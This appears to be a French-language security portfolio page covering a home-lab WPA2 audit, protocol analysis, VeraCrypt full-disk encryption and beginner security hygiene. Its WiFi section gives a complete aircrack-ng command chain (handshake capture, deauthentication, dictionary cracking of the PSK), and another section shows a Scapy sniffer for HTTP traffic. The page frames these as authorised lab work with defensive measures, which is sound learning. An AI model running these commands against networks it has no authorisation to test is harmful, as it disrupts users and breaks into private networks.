DOSSIER 01 / WIFI-AUDIT

Sécurité des réseaux sans-fil

Audit complet WPA2 — capture de handshake, analyse, durcissement.

Contexte

Étude approfondie des mécanismes d'authentification WPA/WPA2 sur un point d'accès dédié au lab. Comprendre la chaîne d'attaque pour mieux la défendre.

Stack utilisée

Kali Linux aircrack-ng airodump-ng aireplay-ng Wireshark

Procédure type

# Activer le mode monitor
sudo airmon-ng start wlan0

# Scanner les réseaux à proximité
sudo airodump-ng wlan0mon

# Cibler un AP — capturer le handshake
sudo airodump-ng -c 6 --bssid <MAC> -w cap wlan0mon

# Forcer une réauth pour accélérer la capture
sudo aireplay-ng --deauth 5 -a <MAC> wlan0mon

# Tenter la cassure du PSK
aircrack-ng -w rockyou.txt -b <MAC> cap*.cap

Mesures de défense

  • Migrer vers WPA3 ou WPA2-AES exclusivement
  • Mot de passe ≥ 14 caractères avec entropie élevée
  • Désactiver WPS (vulnérable par design)
  • Changer les credentials admin par défaut du routeur
  • Activer la journalisation des connexions
⚠ Note légale. Toutes les manipulations ont été réalisées sur un réseau personnel dédié. L'audit WiFi sans autorisation est un délit.
DOSSIER 02 / PROTOCOL-ANALYSIS

Analyse de protocoles

Décortiquer le trafic pour identifier les vulnérabilités structurelles.

Protocoles étudiés

HTTP/HTTPS TCP/UDP SSH DNS FTP SMTP

Outillage

  • wireshark — capture et filtrage temps réel
  • tcpdump — analyse en ligne de commande
  • scapy — forge de paquets personnalisés en Python

Sniffer HTTP — Python / Scapy

from scapy.all import *

def http_sniffer(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        load = pkt[Raw].load
        if b"GET" in load or b"POST" in load:
            print(f"HTTP {load[:80]}")

sniff(filter="tcp port 80", prn=http_sniffer)

Vulnérabilités courantes

  • Mixed content (HTTP encapsulé dans HTTPS)
  • Cipher suites obsolètes (TLS < 1.2)
  • Information leakage dans les headers
  • SSH avec authentification mot de passe seule, root activé
  • DNS sans DoH/DoT — interception facilitée

DOSSIER 04 / FULL-DISK-ENCRYPTION

Chiffrement total VeraCrypt

Chiffrement complet du disque système — protection des données au repos.

Configuration retenue

  • Algorithme : AES-256 (matériel-accéléré)
  • Hash : SHA-512
  • Chiffrement système complet (boot inclus)
  • Mot de passe ≥ 20 caractères avec entropie haute
  • USB de récupération hors site

Procédure de déploiement

  • Sauvegarde intégrale + vérification d'intégrité (SHA-256)
  • Téléchargement VeraCrypt depuis la source officielle
  • Vérification du checksum du binaire
  • Création du Rescue Disk USB
  • Lancement du chiffrement (4–8 h selon volume)
  • Tests de boot et d'intégrité post-chiffrement

Bénéfices opérationnels

  • Protection en cas de vol physique
  • Conformité RGPD pour données sensibles
  • Impact performances négligeable (1–5 % avec AES-NI)
  • Transparent pour l'utilisateur après authentification
⚠ Point critique. La perte du mot de passe maître = perte définitive des données. Sauvegarde et procédure de récupération obligatoires.
DOSSIER 05 / SECURITY-HYGIENE

Hygiène sécurité — débutants

Les règles minimum pour ne pas devenir une cible facile.

Phishing — savoir détecter

  • Ne jamais cliquer sur un lien reçu par SMS/email non sollicité
  • Vérifier l'URL caractère par caractère — amaz0n.com ≠ amazon.com
  • Toujours taper l'adresse manuellement pour les sites sensibles
  • Aucun service légitime ne demande votre mot de passe par email

WiFi — protection minimale

  • WPA2-AES ou WPA3 — jamais WEP
  • Mot de passe long, désactiver WPS
  • Sur WiFi public : VPN obligatoire ou rien d'important

Règles d'or

  • 2FA partout — gestionnaire d'authentification, jamais SMS
  • Mots de passe uniques par site (gestionnaire de mots de passe)
  • Mises à jour système et applicatives — sans exception
  • Ne jamais brancher un USB inconnu trouvé dans la nature
  • Méfiance face à toute demande "urgente" jouant sur la peur

Pour aller plus loin (gratuit)

  • TryHackMe — rooms gratuites pour débuter
  • OverTheWire — wargame Bandit pour la console Linux
  • Documentation officielle Kali Linux
